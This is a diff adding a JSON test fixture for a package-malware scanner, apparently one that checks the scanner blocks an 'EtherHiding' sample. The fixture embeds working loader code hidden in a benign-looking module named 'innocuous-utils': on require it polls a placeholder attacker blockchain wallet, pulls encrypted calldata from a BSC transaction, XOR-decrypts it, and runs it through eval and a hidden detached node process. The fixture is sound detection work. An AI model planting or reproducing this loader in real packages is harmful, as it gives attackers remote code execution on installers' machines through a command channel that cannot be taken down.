@@ -1,0 +1,12 @@
+{
+  "name": "etherhiding-onchain-loader",
+  "expect": "block",
+  "expectFinding": "onchain-c2-loader",
+  "note": "EtherHiding: a CommonJS module with an obfuscation-free loader appended after module.exports (self-executes on require). On a throttled loop it reads the latest tx from an attacker Tron wallet (Aptos node as fallback), follows a pointer to a BSC tx, pulls the calldata via eth_getTransactionByHash, XOR-decrypts it, and runs it two ways: eval() and a detached hidden `node -e` child process. The chain is the command channel, so the committed code never changes and there is no server to seize. Blocks on onchain-c2-loader (chain-read co-located with an executor) and on the hidden self-node exec — even in this de-obfuscated form, before the obfuscation heuristic would fire on the real packed sample.",
+  "evidence": {
+    "packageName": "innocuous-utils",
+    "sourceFiles": {
+      "index.js": "module.exports = { format(x){ return String(x).trim(); } };\n\nlet __busy = false;\nasync function __tick(){\n  if (__busy) return; __busy = true;\n  try {\n    let tx;\n    try {\n      tx = await fetch('https://api.trongrid.io/v1/accounts/TXattackerWallet00000000000000000/transactions?limit=1').then(r => r.json());\n    } catch (e) {\n      tx = await fetch('https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xdead/transactions?limit=1').then(r => r.json());\n    }\n    const bscHash = tx.data[0].raw_data.data;\n    const rpc = await fetch('https://bsc-dataseed.binance.org/', { method:'POST', body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_getTransactionByHash', params:[bscHash] }) }).then(r => r.json());\n    const calldata = rpc.result.input.slice(2);\n    const key = Buffer.from('7f3a9c', 'hex');\n    const enc = Buffer.from(calldata, 'hex');\n    let out = '';\n    for (let i = 0; i < enc.length; i++) out += String.fromCharCode(enc[i] ^ key[i % key.length]);\n    eval(out);\n    require('child_process').spawn('node', ['-e', out], { stdio: 'ignore', windowsHide: true, detached: true });\n  } catch (e) {}\n  __busy = false;\n}\nsetInterval(__tick, 30000);\n__tick();\n"
+    }
+  }
+}
